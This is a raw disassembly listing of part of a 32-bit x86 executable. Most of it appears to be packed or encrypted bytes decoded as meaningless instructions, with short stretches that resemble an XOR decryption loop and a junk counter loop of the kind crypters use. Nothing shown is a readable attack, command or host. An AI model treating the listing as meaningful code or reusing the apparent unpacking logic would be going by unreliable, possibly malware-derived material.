  403183:	add    al,0xc9
  403185:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403186:	faddp  st(5),st
  403188:	mov    ch,0xf9
  40318a:	jno    0x4031c3
  40318c:	nop
  40318d:	mov    dh,0x8a
  40318f:	mov    eax,ds:0xd3272f6d
  403194:	(bad)  
  403195:	hlt    
  403196:	jge    0x4031c6
  403198:	imul   ebx,esi,0xffffffc8
  40319b:	pop    ss
  40319c:	pop    eax
  40319d:	jno    0x40321d
  40319f:	iret   
  4031a0:	(bad)  
  4031a1:	scas   eax,DWORD PTR es:[edi]
  4031a2:	fild   WORD PTR [ebx]
  4031a4:	pushf  
  4031a5:	outs   dx,BYTE PTR ds:[esi]
  4031a6:	out    dx,al
  4031a7:	(bad)  
  4031a8:	xor    al,0x21
  4031aa:	inc    edx
  4031ab:	mov    ds:0x77efbc9e,al
  4031b0:	xor    edi,ebx
  4031b2:	jmp    0x4031b0
  4031b4:	fadd   st(2),st
  4031b6:	mov    ecx,0xf27badd1
  4031bb:	jmp    0x40320b
  4031bd:	mov    ah,BYTE PTR [ecx]
  4031bf:	mov    esp,0x4800d1da
  4031c4:	mov    al,0xa8
  4031c6:	xchg   esp,eax
  4031c7:	inc    ebp
  4031c8:	jnp    0x4031b5
  4031ca:	jle    0x40314f
  4031cc:	cld    
  4031cd:	xor    DWORD PTR [eax],edx
  4031cf:	pop    edi
  4031d0:	fidivr DWORD PTR [ebx]
  4031d2:	push   es
  4031d3:	sub    DWORD PTR [ebp+0x4f7b8308],ebp
  4031d9:	div    DWORD PTR ds:0x9f841aa5
  4031df:	cmp    al,0xa5
  4031e1:	inc    edx
  4031e2:	xchg   DWORD PTR [edi],ecx
  4031e4:	mov    ch,0xeb
  4031e6:	jge    0x40321e
  4031e8:	inc    edi
  4031e9:	icebp  
  4031ea:	clc    
  4031eb:	mov    ch,0xf5
  4031ed:	stos   BYTE PTR es:[edi],al
  4031ee:	call   0x33e3:0x80b62205
  4031f5:	in     eax,0xd3
  4031f7:	iret   
  4031f8:	adc    ecx,ebp
  4031fa:	sbb    eax,0x437f3b04
  4031ff:	fst    QWORD PTR ds:0x99082c17
  403205:	xchg   ecx,eax
  403206:	pop    eax
  403207:	mov    esp,0x312bfe8b
  40320c:	mov    bh,0x87
  40320e:	ja     0x40319f
  403210:	ja     0x403257
  403212:	jmp    0xaee3:0x9032de09
  403219:	(bad)  
  40321a:	adc    al,0x77
  40321c:	or     eax,DWORD PTR [edx]
  40321e:	fisub  WORD PTR [ebx-0x2b]
  403221:	and    eax,0x66557234
  403226:	mov    gs,WORD PTR [esi-0x72b58ae6]
  40322c:	or     DWORD PTR [esi],esi
  40322e:	daa    
  40322f:	mov    ah,dh
  403231:	or     edx,DWORD PTR ds:0xa2b7812b
  403237:	sub    DWORD PTR [eax],0x3a
  40323a:	fmul   QWORD PTR [edx+0x45]
  40323d:	dec    edi
  40323e:	icebp  
  40323f:	mov    bl,0xad
  403241:	jl     0x403220
  403243:	cmc    
  403244:	xor    edi,edi
  403246:	arpl   WORD PTR [edx+0x69],si
  403249:	jmp    0x16bf:0xc14ca4f4
  403250:	jb     0x4031ec
  403252:	inc    eax
  403253:	je     0x4032a9
  403255:	mov    al,0xb4
  403257:	xchg   edi,eax
  403258:	and    ecx,DWORD PTR [esi]
  40325a:	fsubrp st(4),st
  40325c:	pop    ds
  40325d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40325e:	(bad)  
  40325f:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  403261:	jae    0x4032dc
  403263:	fsub   DWORD PTR [ebx-0x1f]
  403266:	pop    esi
  403267:	jne    0x4032e8
  403269:	stos   DWORD PTR es:[edi],eax
  40326a:	cdq    
  40326b:	mov    BYTE PTR [edi-0x771c8224],ah
  403271:	aaa    
  403272:	std    
  403273:	and    WORD PTR [eax-0x6a35fdfe],cx
  40327a:	fmulp  st(7),st
  40327c:	rcl    ebp,1
  40327e:	test   DWORD PTR [ecx+ebp*4],ebx
  403281:	or     DWORD PTR [ebx-0x61],ebp
  403284:	loope  0x403267
  403286:	shl    BYTE PTR [esp+esi*2-0x38],1
  40328a:	test   DWORD PTR [eax+0x7d4af7dc],esi
  403290:	ror    dl,cl
  403292:	pop    ds
  403293:	xor    BYTE PTR [ecx+0x305c3f35],cl
  403299:	(bad)  
  40329a:	(bad)  
  40329c:	jg     0x4032cd
  40329e:	inc    edx
  40329f:	dec    bh
  4032a1:	loop   0x4032d2
  4032a3:	ins    BYTE PTR es:[edi],dx
  4032a4:	sub    DWORD PTR [edi],esp
  4032a6:	int    0x43
  4032a8:	cmovne edi,esp
  4032ab:	mov    BYTE PTR [ecx-0x7bfb435d],0xa4
  4032b2:	out    0xde,al
  4032b4:	int    0x46
  4032b6:	cwde   
  4032b7:	into   
  4032b8:	sahf   
  4032b9:	out    0xd8,al
  4032bb:	imul   esi,DWORD PTR [edx],0x23
  4032be:	lds    ebx,FWORD PTR [esi+0x66d605f2]
  4032c4:	mov    bh,0xa4
  4032c6:	aad    0x25
  4032c8:	pushf  
  4032c9:	push   ebx
  4032ca:	dec    esp
  4032cb:	cmp    DWORD PTR [esi],esi
  4032cd:	es mov al,0xea
  4032d0:	push   ebp
  4032d1:	pop    es
  4032d2:	cli    
  4032d3:	jle    0x40327f
  4032d5:	(bad)  
  4032d7:	jae    0x403281
  4032d9:	mov    ebx,0xc0763991
  4032de:	out    dx,al
  4032df:	cmc    
  4032e0:	sub    ecx,ecx
  4032e2:	popa   
  4032e3:	cmp    esi,edx
  4032e5:	pop    edx
  4032e6:	sahf   
  4032e7:	in     eax,dx
  4032e8:	add    eax,0xf8243adc
  4032ed:	test   al,0x57
  4032ef:	neg    DWORD PTR [ecx+0x68]
  4032f2:	das    
  4032f3:	pushf  
  4032f4:	lahf   
  4032f5:	ffreep st(2)
  4032f7:	sbb    al,0xbe
  4032f9:	xlat   BYTE PTR ds:[ebx]
  4032fa:	cmp    BYTE PTR [esi-0x59],0x81
  4032fe:	xchg   esp,eax
  4032ff:	call   0xaa567281
  403304:	call   0xd0cc:0x311430c
  40330b:	dec    ebp
  40330c:	(bad)  
  40330d:	in     al,dx
  40330e:	inc    edi
  40330f:	cmp    al,0xd7
  403311:	icebp  
  403312:	pop    edx
  403313:	imul   esi,esi,0x58
  403316:	stos   BYTE PTR es:[edi],al
  403317:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403318:	cmp    al,0xd8
  40331a:	stos   DWORD PTR es:[edi],eax
  40331b:	add    al,0xbf
  40331d:	ret    
  40331e:	cmp    BYTE PTR [edx],0x17
  403321:	jbe    0x40336a
  403323:	xchg   edi,eax
  403324:	dec    ebx
  403325:	sub    DWORD PTR [ebp+0x77ac07e],edx
  40332b:	push   ebp
  40332c:	push   ss
  40332d:	push   es
  40332e:	sbb    DWORD PTR [eax-0x3365a673],ecx
  403334:	bound  ecx,QWORD PTR [edi+0x33ae6db0]
  40333a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40333b:	pusha  
  40333c:	in     al,dx
  40333d:	loopne 0x40337c
  40333f:	push   ecx
  403340:	push   ebx
  403341:	push   esp
  403342:	push   ebx
  403343:	std    
  403344:	js     0x4032e4
  403346:	arpl   WORD PTR [ecx],bp
  403348:	jecxz  0x403307
  40334a:	dec    esp
  40334b:	or     bh,ah
  40334d:	fwait
  40334e:	mov    al,ds:0x916f9318
  403353:	lock ins BYTE PTR es:[edi],dx
  403355:	jge    0x403368
  403357:	mov    ds:0xeb96c368,al
  40335c:	movsx  edx,WORD PTR [eax-0x5f]
  403360:	dec    edx
  403361:	pop    ds
  403362:	inc    esi
  403363:	outs   dx,DWORD PTR ds:[esi]
  403364:	jmp    0xeeaa:0xf12b17d3
  40336b:	push   0xfffffff4
  40336d:	mov    bl,0xe7
  40336f:	rcr    DWORD PTR [edx+edi*8],1
  403372:	pop    edi
  403373:	push   cs
  403374:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403375:	in     eax,0xd5
  403377:	cmp    bh,al
  403379:	imul   eax,DWORD PTR [ebx-0x5d7ef2b9],0x7a347a7
  403383:	add    BYTE PTR [edx-0x48fd6e8c],ch
  403389:	push   esi
  40338a:	xor    edi,DWORD PTR [eax]
  40338c:	mov    ebp,fs
  40338e:	inc    ecx
  40338f:	cmp    edx,DWORD PTR [eax-0x225471bf]
  403395:	inc    ecx
  403396:	(bad)  
  403397:	arpl   WORD PTR [eax],di
  403399:	pop    esi
  40339a:	jg     0x403327
  40339c:	jne    0x4033a6
  40339e:	imul   edi,edx
  4033a1:	mov    ebx,DWORD PTR [ebp+0xc]
  4033a4:	xor    eax,ecx
  4033a6:	add    eax,edx
  4033a8:	jmp    0x403687
  4033ad:	jecxz  0x4033d3
  4033af:	fcom   DWORD PTR [edx]
  4033b1:	out    0xd2,eax
  4033b3:	icebp  
  4033b4:	icebp  
  4033b5:	pop    es
  4033b6:	xchg   edx,eax
  4033b7:	aaa    
  4033b8:	aas    
  4033b9:	pop    ebx
  4033ba:	or     al,0xbb
  4033bc:	add    DWORD PTR [edx],edi
  4033be:	adc    al,0x70
  4033c0:	jo     0x403380
  4033c2:	jle    0x403434
  4033c4:	jo     0x4033bd
  4033c6:	test   DWORD PTR [edx+0x4d7776a9],eax
  4033cc:	in     eax,0x68
  4033ce:	sub    BYTE PTR [edi+0x12],ch
  4033d1:	aam    0xb8
  4033d3:	inc    ebp
  4033d4:	pop    esp
  4033d5:	push   0x31
  4033d7:	cdq    
  4033d8:	xchg   edi,eax
  4033d9:	or     eax,0x3cfcb998
  4033de:	lods   al,BYTE PTR ds:[esi]
  4033df:	or     DWORD PTR [ecx+0x4ecc9599],esp
  4033e5:	enter  0x7fee,0x39
  4033e9:	lods   al,BYTE PTR ds:[esi]
  4033ea:	into   
  4033eb:	jne    0x403384
  4033ed:	and    DWORD PTR [ecx+0x56cc16eb],0x3001745f
  4033f7:	dec    edi
  4033f8:	imul   esi,DWORD PTR [edx],0xffffffb7
  4033fb:	ins    BYTE PTR es:[edi],dx
  4033fc:	(bad)  
  4033fd:	pop    esi
  4033fe:	in     eax,dx
  4033ff:	pop    ebx
  403401:	shl    BYTE PTR [ecx],cl
  403403:	cs (bad) 
  403406:	hlt    
  403407:	imul   esp,DWORD PTR [ecx-0x73fa8c0d],0x6e5689d9
  403411:	push   ebp
  403412:	jmp    0x4033e2
  403414:	mov    esp,0x5191a470
  403419:	mov    eax,ds:0xa5a17191
  40341e:	mul    eax
  403420:	dec    eax
  403421:	ins    DWORD PTR es:[edi],dx
  403422:	jmp    0x4033f4
  403424:	xor    bl,bl
  403426:	mov    al,0x46
  403428:	mov    cl,ch
  40342a:	ins    DWORD PTR es:[edi],dx
  40342b:	and    al,0xad
  40342d:	fistp  DWORD PTR [ebp-0x401406f4]
  403433:	repz xchg edx,eax
  403435:	and    eax,0xc84e5e81
  40343a:	mov    edi,eax
  40343c:	and    ch,ch
  40343e:	push   es
  40343f:	or     eax,0x555b8b1
  403444:	add    DWORD PTR [edi+0x43427241],0x2c31b3c
  40344e:	outs   dx,BYTE PTR ds:[esi]
  40344f:	(bad)  
  403450:	aas    
  403451:	in     al,dx
  403452:	(bad)  
  403453:	mov    DWORD PTR [ebx-0x56],esi
  403456:	clc    
  403457:	inc    esp
  403458:	cmp    DWORD PTR [eax-0x79],edi
  40345b:	add    BYTE PTR [esi+0x3763c97b],ch
  403461:	or     ecx,0xfffffffc
  403464:	fwait
  403465:	xor    ecx,0x62
  403468:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403469:	xor    al,0x75
  40346b:	cmp    edx,DWORD PTR ds:0xad019163
  403471:	pushf  
  403472:	push   esi
  403473:	in     eax,0xf3
  403475:	sub    ch,BYTE PTR [ebx+0x7de48b28]
  40347b:	jno    0x4034a6
  40347d:	push   esi
  40347e:	repz daa 
  403480:	mov    dh,0xfe
  403482:	jns    0x40340f
  403484:	push   DWORD PTR [edi-0x37]
  403487:	dec    esp
  403488:	loop   0x403484
  40348a:	jne    0x4034e3
  40348c:	outs   dx,DWORD PTR ds:[esi]
  40348d:	add    eax,0xd080d263
  403492:	dec    esp
  403493:	jne    0x4034d0
  403495:	enter  0xc0e2,0xbc
  403499:	cmp    eax,0xa38c358b
  40349e:	fdivr  DWORD PTR [edx]
  4034a0:	int3   
  4034a1:	icebp  
  4034a2:	push   esi
  4034a3:	jl     0x40351e
  4034a5:	sub    edi,DWORD PTR [ebp+0x69]
  4034a8:	outs   dx,BYTE PTR ds:[esi]
  4034a9:	inc    ecx
  4034aa:	cmp    eax,0x792eafdb
  4034af:	dec    ebx
  4034b0:	push   edi
  4034b1:	and    eax,0xc3d5e096
  4034b6:	test   al,0xf5
  4034b8:	xor    al,0x74
  4034ba:	sub    al,0x94
  4034bc:	cdq    
  4034bd:	xor    eax,0x103c4324
  4034c2:	mov    ch,0x49
  4034c4:	aaa    
  4034c5:	(bad)  
  4034c6:	sbb    al,0xcd
  4034c8:	arpl   WORD PTR [ebp-0x54f1c05],ax
  4034ce:	mov    edi,0xd2485afd
  4034d3:	es (bad) 
  4034d5:	jmp    0xa9e0c83d
  4034da:	mov    ch,0x70
  4034dc:	cs sbb eax,0x296a6220
  4034e2:	call   0x2dc2a0bc
  4034e7:	mov    dh,0xb7
  4034e9:	sbb    DWORD PTR [ebx+ebp*4-0x2a],edi
  4034ed:	jbe    0x4034ec
  4034ef:	je     0x4034ce
  4034f1:	dec    ebp
  4034f2:	sete   BYTE PTR [ecx]
  4034f5:	icebp  
  4034f6:	inc    edx
  4034f7:	dec    ebp
  4034f8:	jmp    0xb0001637
  4034fd:	mov    ah,dl
  4034ff:	xchg   edx,eax
  403500:	sbb    cl,BYTE PTR [ecx-0x155686c7]
  403506:	xor    al,0x23
  403508:	addr16 aam 0xc7
  40350b:	adc    eax,0xdc8f4f0f
  403510:	inc    ebx
  403511:	lahf   
  403512:	loop   0x4034fa
  403514:	vcvtss2si ebx,DWORD PTR [ecx-0x3e]
  403519:	or     DWORD PTR [edi+0x6bb5c67d],ebx
  40351f:	fstp   TBYTE PTR ds:0xa72a458
  403525:	mov    eax,0x3a700f47
  40352a:	cmc    
  40352b:	or     al,0xf0
  40352d:	add    ebx,eax
  40352f:	adc    BYTE PTR [eax+edi*4],dh
  403532:	pop    es
  403533:	sub    eax,0xd7ec1641
  403538:	sbb    al,BYTE PTR [ebx]
  40353a:	sub    eax,0xb498fe7f
  40353f:	fld    QWORD PTR [edx+0x184ebf04]
  403545:	add    eax,edi
  403547:	jecxz  0x4034d0
  403549:	shl    BYTE PTR [esp+edi*1-0x60],1
  40354d:	dec    edx
  40354e:	or     al,0x76
  403550:	inc    ebp
  403551:	mov    dl,0x78
  403553:	es sbb eax,0x4eaddf85
  403559:	pusha  
  40355a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40355b:	jecxz  0x4035d0
  40355d:	mov    eax,ds:0x7dec8bc5
  403562:	inc    edi
  403563:	gs dec ebx
  403565:	push   eax
  403566:	ffree  st(4)
  403568:	out    0xe,eax
  40356a:	jno    0x403560
  40356c:	enter  0xc3d3,0x95
  403570:	sub    ebp,DWORD PTR [ebx]
  403572:	test   eax,0x26477d5b
  403577:	inc    ebp
  403578:	repz sub ah,bl
  40357b:	lds    esp,FWORD PTR [ecx]
  40357d:	and    BYTE PTR [edx+0x10],bh
  403580:	inc    ebx
  403581:	xchg   edi,eax
  403582:	out    0x6e,eax
  403584:	cmp    dl,BYTE PTR [edx+0x2811abd6]
  40358a:	inc    ebp
  40358b:	mov    eax,ds:0xd2c29481
  403590:	jns    0x4035de
  403592:	sti    
  403593:	fucomp st(1)
  403595:	ja     0x40351f
  403597:	shl    BYTE PTR [ebp-0x3af22e4e],0x21
  40359e:	xchg   esp,eax
  40359f:	imul   eax,DWORD PTR [eax+0x69],0x97f02785
  4035a6:	ins    DWORD PTR es:[edi],dx
  4035a7:	cmp    DWORD PTR [esi+eax*4+0x18],ecx
  4035ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035ac:	retf   
  4035ad:	fadd   QWORD PTR [ebx-0x3b]
  4035b0:	in     eax,0xdb
  4035b2:	cmp    esp,edi
  4035b4:	xor    ebp,0x315a0193
  4035ba:	mov    esi,0x6f473393
  4035bf:	jmp    0xd197d889
  4035c4:	pop    ebx
  4035c5:	dec    esp
  4035c6:	retf   0x4d33
  4035c9:	fs cmc 
  4035cb:	xchg   edi,eax
  4035cc:	retf   
  4035cd:	je     0x40356b
  4035cf:	mov    esi,0x784e41a8
  4035d4:	fcom   st(5)
  4035d6:	(bad)  
  4035d7:	and    eax,0x2ab7540f
  4035dc:	rol    DWORD PTR ds:[edx+0x6b64302e],0x62
  4035e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035e5:	je     0x403611
  4035e7:	jb     0x40358f
  4035e9:	shr    DWORD PTR [edx],0x36
  4035ec:	test   ah,bh
  4035ee:	cmp    DWORD PTR [edx+0x680737d8],edx
  4035f4:	mov    ds,WORD PTR [esi-0x5a]
  4035f7:	cmp    BYTE PTR [eax],ah
  4035f9:	dec    esi
  4035fa:	xor    al,0xce
  4035fc:	adc    al,BYTE PTR [ebp+0x4d402302]
  403602:	xchg   esp,eax
  403603:	mov    edx,0x623a32d2
  403608:	out    dx,al
  403609:	clc    
  40360a:	inc    ecx
  40360b:	mov    ecx,0x15bf1a19
  403610:	add    BYTE PTR fs:[esi+eiz*8-0x3acf1c20],bl
  403618:	(bad)  
  403619:	inc    ebp
  40361a:	jmp    0x4fffba0d
  40361f:	lahf   
  403620:	fwait
  403621:	xor    BYTE PTR gs:[ecx],0x79
  403625:	mov    bh,BYTE PTR [ecx+0x2f007564]
  40362b:	mov    ds:0x1ac7922f,al
  403630:	dec    ecx
  403631:	test   BYTE PTR [ecx+0x7f],bl
  403634:	sub    DWORD PTR [edi],ebx
  403636:	add    dl,bl
  403638:	sahf   
  403639:	in     eax,0xf5
  40363b:	xlat   BYTE PTR ds:[ebx]
  40363c:	and    edi,DWORD PTR [ecx+0x3261aac9]
  403642:	repnz les ebp,FWORD PTR [edx-0x64]
  403646:	ins    BYTE PTR es:[edi],dx
  403647:	or     bl,BYTE PTR [esp+eax*8]
  40364a:	pop    ss
  40364b:	repnz nop
  40364d:	stos   DWORD PTR es:[edi],eax
  40364e:	xchg   esp,eax
  40364f:	in     al,dx
  403650:	push   0x1ad3cdd3
  403655:	mov    ch,dl
  403657:	inc    esi
  403658:	mov    esp,0x2368d72c
  40365d:	dec    edi
  40365e:	aad    0x48
  403660:	or     al,0xd3
  403662:	push   edx
  403663:	add    BYTE PTR [ecx],ah
  403665:	xchg   esi,eax
  403666:	cmp    al,0x4e
  403668:	pop    eax
  403669:	imul   eax,DWORD PTR [ecx-0x74],0x6
  40366d:	mov    ds:0x70592cda,eax
  403672:	sub    eax,0xf3004cfe
  403677:	sub    ah,BYTE PTR [esi-0x29]
  40367a:	in     al,dx
  40367b:	push   esp
  40367c:	and    al,0x56
  40367e:	push   edi
  40367f:	(bad)  
  403680:	stos   BYTE PTR es:[edi],al
  403681:	cli    
  403682:	aaa    
  403683:	dec    esp
  403684:	or     ch,al
  403686:	arpl   WORD PTR [edx+0x729c0384],cx
  40368c:	xor    al,BYTE PTR [eax]
  40368e:	mov    BYTE PTR [edi+esi*1],al
  403691:	mov    eax,DWORD PTR [ebp-0x4]
  403694:	xor    eax,ecx
  403696:	lea    edx,[edx+eax*1+0x32729c]
  40369d:	mov    eax,DWORD PTR [ebp-0x4]
  4036a0:	xor    eax,ecx
  4036a2:	mov    esi,0xffcd8d64
  4036a7:	sub    esi,eax
  4036a9:	add    esi,DWORD PTR [ebp+0x10]
  4036ac:	cmp    edx,esi
  4036ae:	jbe    0x4030ad
  4036b4:	pop    ebx
  4036b5:	mov    eax,0xf89c8530
  4036ba:	pop    edi
  4036bb:	pop    esi
  4036bc:	leave  
  4036bd:	ret    0xc
  4036c0:	push   ebp
  4036c1:	mov    ebp,esp
  4036c3:	sub    esp,0x58
  4036c6:	mov    DWORD PTR ds:0x42fced,0x17
  4036d0:	cmp    DWORD PTR ds:0x42fced,0x0
  4036d7:	je     0x40372c
  4036dd:	cmp    DWORD PTR ds:0x42fced,0x7
  4036e4:	jne    0x4036fc
  4036ea:	push   0x0
  4036ec:	push   0x25f8
  4036f1:	push   0x8523
  4036f6:	call   DWORD PTR ds:0x42e2d7
  4036fc:	cmp    DWORD PTR ds:0x42fced,0x8
  403703:	jne    0x403717
  403709:	xor    eax,eax
  40370b:	or     eax,DWORD PTR ds:0x42fced
  403711:	dec    eax
  403712:	mov    ds:0x42fced,eax
  403717:	mov    eax,ds:0x42fced
  40371c:	dec    eax
  40371d:	mov    ds:0x42fced,eax
  403722:	jmp    0x4036d0
  403727:	adc    eax,0xdf
  40372c:	mov    ecx,DWORD PTR [ebp+0x8]
  40372f:	add    DWORD PTR ds:0x42e6f3,0x693e
  403739:	mov    eax,0x8a3e
  40373e:	adc    DWORD PTR ds:0x42e6f7,0x5ea2
  403748:	xor    ax,WORD PTR [ecx+0x20]
  40374c:	adc    DWORD PTR ds:0x42fd0d,ecx
  403752:	mov    ecx,0x3b04
  403757:	and    DWORD PTR ds:0x42e713,0x42e11c
  403761:	add    ax,cx
  403764:	mov    DWORD PTR ds:0x42fd7a,0x1b71
  40376e:	movzx  eax,ax
  403771:	mov    DWORD PTR [ebp-0xc],eax
  403774:	or     DWORD PTR ds:0x42e124,0x7677
  40377e:	mov    BYTE PTR [ebp-0x1],0x7f
  403782:	not    ecx
  403784:	lea    eax,[ebp-0x1]
  403787:	mov    DWORD PTR [ebp-0x10],eax
  40378a:	or     DWORD PTR ds:0x42e70f,ecx
  403790:	jmp    0x403af0
  403795:	out    0x52,eax
  403797:	out    0x78,al
  403799:	jno    0x40374f
  40379b:	in     eax,0x71
  40379d:	or     BYTE PTR [edx+0x68],bl
  4037a0:	and    DWORD PTR [ecx+0x7838df0b],ebp
  4037a6:	adc    DWORD PTR [eax+0x70],esi
  4037a9:	cmp    eax,0x5170707d
  4037ae:	jmp    0x403791
  4037b0:	lock in eax,0x6b
  4037b3:	push   esp
  4037b4:	and    al,0x75
  4037b6:	fcmove st,st(6)
  4037b8:	mov    al,0x84
  4037ba:	pop    ecx
  4037bb:	test   eax,0x62adb624
  4037c0:	pop    es
  4037c1:	mov    edx,0xffd78f6d
  4037c6:	ins    DWORD PTR es:[edi],dx
  4037c7:	inc    ecx
  4037c8:	lods   al,BYTE PTR ds:[esi]
  4037c9:	dec    esi
  4037ca:	in     eax,0xef
  4037cc:	dec    ebp
  4037cd:	in     al,0x2e
  4037cf:	and    eax,0xe2a6bc6
  4037d4:	pop    ebx
  4037d5:	push   eax
  4037d6:	or     al,al
  4037d8:	dec    ebp
  4037d9:	push   edi
  4037da:	jno    0x403838
  4037dc:	and    al,0x18
  4037de:	hlt    
  4037df:	repnz ficom WORD PTR [edx]
  4037e2:	out    dx,eax
  4037e3:	mov    DWORD PTR [ebx+0x52],esi
  4037e6:	jmp    0x1a6eb963
  4037eb:	hlt    
  4037ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037ed:	in     al,0x68
  4037ef:	nop
  4037f0:	push   0xffffff91
  4037f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037f3:	addr16 sbb eax,0x117777ab
  4037f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037fa:	or     BYTE PTR [ebp+0x52ebf5fe],bl
  403800:	mov    DWORD PTR [ebp+0x7f1b8cdb],eax
  403806:	xor    edi,edx
  403808:	pop    edx
  403809:	mov    ecx,ds
  40380b:	addr16 dec ecx
  40380d:	xor    al,0xac
  40380f:	dec    eax
  403810:	pop    ss
  403811:	mov    eax,0x71fb790e
  403816:	mov    esp,0xc216103a
  40381b:	stc    
  40381c:	loop   0x403800
  40381e:	mov    al,bl
  403820:	fldcw  WORD PTR [edx+0x252abe9]
  403826:	jecxz  0x403808
  403828:	cld    
  403829:	jb     0x403803
  40382b:	fidivr DWORD PTR [eax+0x2c]
  40382e:	sbb    DWORD PTR [edi-0x984d7c9],0xffffffa1
  403835:	test   eax,0x40265593
  40383a:	popf   
  40383b:	push   ebp
  40383c:	test   eax,0x79b57737
  403841:	fucom  st(3)
  403843:	leave  
  403844:	ja     0x403830
  403846:	dec    ecx
  403847:	inc    esi
  403848:	push   es
  403849:	fdiv   DWORD PTR [edx]
  40384b:	mov    ds:0x8aa4940f,al
  403850:	cmp    DWORD PTR [ecx],ebx
  403852:	shr    bh,cl
  403854:	(bad)
  403857:	jmp    FWORD PTR [ecx+eiz*1-0x2b]
  40385b:	retf   
  40385c:	popa   
  40385d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40385e:	mov    ah,0xc3
  403860:	enter  0xaf30,0x98
  403864:	adc    eax,0x12293ae6
  403869:	daa    
  40386a:	aad    0x33
  40386c:	or     bl,BYTE PTR [ebp-0x4d4ca677]
  403872:	leave  
  403873:	xlat   BYTE PTR ds:[ebx]
  403874:	pop    ds
  403875:	and    DWORD PTR [esi+0x17d53a0],esp
  40387b:	ss jne 0x40380e
  40387e:	fwait
  40387f:	adc    eax,0x551e6b1b
  403884:	into   
  403885:	jnp    0x4038e5
  403887:	je     0x403871
  403889:	push   ecx
  40388a:	cmp    BYTE PTR [ebx+0x10],0xa
  40388e:	hlt    
  40388f:	lock cmp DWORD PTR ds:0x7909c160,edi
  403896:	push   ecx
  403897:	fnstsw WORD PTR [edi]
  403899:	in     eax,0x18
  40389b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40389c:	rol    BYTE PTR [eax-0x1726fbdb],0xc6
  4038a3:	jae    0x4038f6
  4038a5:	andnps xmm7,XMMWORD PTR [esi-0x70]
  4038a9:	pushf  
  4038aa:	mov    dh,0x16
  4038ac:	ja     0x40391a
  4038ae:	outs   dx,BYTE PTR ds:[esi]
  4038af:	cmp    DWORD PTR [eax],esp
  4038b1:	fwait
  4038b2:	outs   dx,BYTE PTR ds:[esi]
  4038b3:	jp     0x4038f4
  4038b5:	mov    esi,DWORD PTR ds:0x6768eb8b
  4038bb:	stc    
  4038bc:	cmp    al,0xf7
  4038be:	ins    BYTE PTR es:[edi],dx
  4038bf:	rcr    BYTE PTR [ebx+0x5120cac7],1
  4038c5:	and    BYTE PTR [edi-0x3c],0xbd
  4038c9:	sbb    DWORD PTR [eax],ebx
  4038cb:	hlt    
  4038cc:	sbb    BYTE PTR [ebp-0x5dc276d],dh
  4038d2:	fcmovnu st,st(3)
  4038d4:	xor    DWORD PTR cs:[ebp+0x3a8ba83b],0x216071a2
  4038df:	lock pop edi
  4038e1:	inc    ecx
  4038e2:	add    BYTE PTR [edi],al
  4038e4:	and    BYTE PTR [edi+0x48],bl
  4038e7:	sub    eax,0xb6ad4420
  4038ec:	xchg   ebx,eax
  4038ed:	daa    
  4038ee:	loop   0x4038da
  4038f0:	gs js  0x4038ad
  4038f3:	jecxz  0x4038f0
  4038f5:	hlt    
  4038f6:	(bad)  
  4038f7:	div    ebx
  4038f9:	addr16 adc esp,0x117e6274
  403900:	cmp    DWORD PTR [edi],edx
  403902:	jp     0x40396a
  403904:	jge    0x403971
  403906:	bound  esp,QWORD PTR [edx+edi*2]
  403909:	std    
  40390a:	mov    edx,0xbbe94530
  40390f:	push   0xbaf881be
  403914:	jl     0x403940
  403916:	jae    0x403952
  403918:	call   0x7922:0xf975baad
  40391f:	pop    eax
  403920:	add    dl,bl
  403922:	fnstenv [ebx]
  403924:	dec    edx
  403925:	cmp    ecx,DWORD PTR [eax]
  403927:	cmp    dl,ah
  403929:	push   edx
  40392a:	and    eax,0x37a5e9c8
  40392f:	push   ss
  403930:	sbb    BYTE PTR [ebp-0x2f0ae492],dl
  403936:	(bad)  
  403937:	mov    ds:0x64e699ec,eax
  40393c:	pop    ebx
  40393d:	add    dl,dh
  40393f:	dec    ebx
  403940:	fild   DWORD PTR [edx-0x518e7f57]
  403946:	es dec esp
  403948:	fs push ecx
  40394a:	mov    ds:0x3b2663d5,al
  40394f:	(bad)  
  403950:	mov    ch,0x16
  403952:	div    DWORD PTR [ebp-0x12]
  403955:	and    eax,DWORD PTR [ebx]
  403957:	cld    
  403958:	push   edi
  403959:	mov    esi,0x5d4f89d6
  40395e:	daa    
  40395f:	jbe    0x4038e5
  403961:	int    0xd2
  403963:	fnstsw WORD PTR [eax-0x314a62f0]
  403969:	sahf   
  40396a:	retf   
  40396b:	outs   dx,DWORD PTR ds:[esi]
  40396c:	dec    eax
  40396d:	adc    al,0x9d
  40396f:	jae    0x4039cf
  403971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403972:	in     eax,dx
  403973:	xchg   ebx,eax
  403974:	jle    0x403956
  403976:	xor    eax,0xacdc0e84
  40397b:	xor    bh,BYTE PTR [esi-0x3e150770]
  403981:	and    cl,BYTE PTR [ecx]
  403983:	xlat   BYTE PTR ds:[ebx]
  403984:	stos   BYTE PTR es:[edi],al
  403985:	xor    DWORD PTR [esi],ecx
  403987:	adc    DWORD PTR [edx],esp
  403989:	jmp    0x5db0d8a
  40398e:	xchg   ebp,eax
  40398f:	jbe    0x4039ee
  403991:	ins    BYTE PTR es:[edi],dx
  403992:	fimul  DWORD PTR [ecx]
  403994:	dec    esi
  403995:	add    DWORD PTR [eax],ecx
  403997:	aas    
  403998:	add    dh,cl
  40399a:	sub    eax,edi
  40399c:	sub    bh,BYTE PTR [edx+0x55]
  40399f:	inc    eax
  4039a0:	cmp    esi,DWORD PTR [ebp+edx*1-0x11f0c320]
  4039a7:	cmp    al,0xc9
